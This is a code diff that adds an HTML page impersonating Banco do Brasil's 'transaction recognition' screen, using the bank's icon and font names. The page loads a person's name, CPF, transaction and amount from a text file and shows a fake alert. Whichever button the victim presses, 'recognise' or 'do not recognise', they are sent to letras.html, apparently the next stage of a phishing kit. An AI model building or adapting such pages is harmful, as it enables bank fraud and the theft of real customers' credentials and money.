@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/toastify-js/src/toastify.min.css">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.1/css/all.css" crossorigin="anonymous">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="bb.ico">
+    <title>Reconhecimento de Transação</title>
+    <style>
+        @font-face {
+            font-family: "FontCustom";
+            src: url("banco_do_brasil_textos_bold.ttf") format("truetype");
+        }
+        @font-face {
+            font-family: "FontCustom2";
+            src: url("banco_do_brasil_textos_medium.ttf") format("truetype");
+        }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+        .header2 {
+            background-color: #1752fc;
+            height: 16px;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 0 24px;
+            flex-direction: column;
+        }
+        .container-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin: 20px 24px;
+        }
+        h2 {
+            margin: 0;
+            text-align: center;
+            font-family: "FontCustom2", Arial, sans-serif;
+            font-size: 20px;
+        }
+        .back-icon {
+            color: #1752fc;
+            font-size: 24px;
+            margin-right: 10px;
+        }
+        #transaction-details {
+            width: 100%;
+            max-width: 600px;
+            margin-top: 20px;
+            font-family: "FontCustom2", Arial, sans-serif;
+            font-size: 16px;
+        }
+        #transaction-details p {
+            margin-bottom: 10px;
+        }
+        .confirmation-buttons {
+            display: flex;
+            justify-content: center;
+            margin-top: 20px;
+        }
+        .confirmation-buttons button {
+            padding: 10px 20px;
+            margin: 0 10px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-family: "FontCustom", Arial, sans-serif;
+            font-size: 16px;
+        }
+        .confirmation-buttons button.confirm {
+            background-color: green;
+            color: white;
+        }
+        .confirmation-buttons button.deny {
+            background-color: red;
+            color: white;
+        }
+        .loading-icon {
+            width: 50px;
+            height: 50px;
+            border: 5px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 5px solid #525eff;
+            animation: spin 2s linear infinite;
+            margin-top: 16px;
+        }
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        .loading-content {
+            position: absolute;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+        .loading-bg {
+            visibility: hidden;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.8);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .loading-text {
+            font-size: 20px;
+            font-family: "FontCustom", Arial, sans-serif;
+        }
+    </style>
+</head>
+<body>
+    <script src="https://cdn.jsdelivr.net/npm/toastify-js@1.11.2"></script>
+    <img style="margin-bottom: -6px;" src="top2.jpeg" width="100%" />
+    <div class="header2"></div>
+
+    <div class="container-header">
+        <h2>Reconhecimento de Transação</h2>
+        <div style="width: 24px"></div>
+    </div>
+
+    <div class="container">
+        <div id="transaction-details"></div>
+        <div class="confirmation-buttons">
+            <button class="confirm" onclick="confirmTransaction()">Reconheço</button>
+            <button class="deny" onclick="denyTransaction()">Não Reconheço</button>
+        </div>
+    </div>
+
+    <div id="loading" class="loading-bg">
+        <div class="loading-content">
+            <div class="loading-icon"></div>
+            <p class="loading-text">Carregando...</p>
+        </div>
+    </div>
+
+    <script>
+        function fetchTransactionData() {
+            document.getElementById("loading").style.visibility = "visible";
+            fetch('a.txt') // Substitua pela URL correta
+                .then(response => response.text())
+                .then(data => {
+                    const lines = data.split('\n');
+                    if (lines.length >= 6) {
+                        const nome = lines[0];
+                        const cpf = lines[1];
+                        const transacao = lines[2];
+                        const data = lines[3];
+                        const hora = lines[4];
+                        const valor = lines[5];
+
+                        const transactionDetails = document.getElementById('transaction-details');
+                        transactionDetails.innerHTML = `
+                            <p><strong>Nome:</strong> ${nome}</p>
+                            <p><strong>CPF:</strong> ${cpf}</p>
+                            <p><strong>Transação:</strong> ${transacao}</p>
+                            <p><strong>Data:</strong> ${data}</p>
+                            <p><strong>Hora:</strong> ${hora}</p>
+                            <p><strong>Valor:</strong> ${valor}</p>
+                        `;
+                    } else {
+                        Toastify({ text: "Dados da transação inválidos.", backgroundColor: "red", duration: 4000 }).showToast();
+                    }
+                    document.getElementById("loading").style.visibility = "hidden";
+                })
+                .catch(error => {
+                    Toastify({ text: "Erro ao buscar dados da transação.", backgroundColor: "red", duration: 4000 }).showToast();
+                    console.error("Erro:", error);
+                    document.getElementById("loading").style.visibility = "hidden";
+                });
+        }
+
+        fetchTransactionData();
+
+        function confirmTransaction() {
+            window.location.href = 'letras.html'; // Substitua pela URL correta
+        }
+
+        function denyTransaction() {
+            window.location.href = 'letras.html'; // Substitua pela URL correta
+        }
+    </script>
+</body>
+</html>
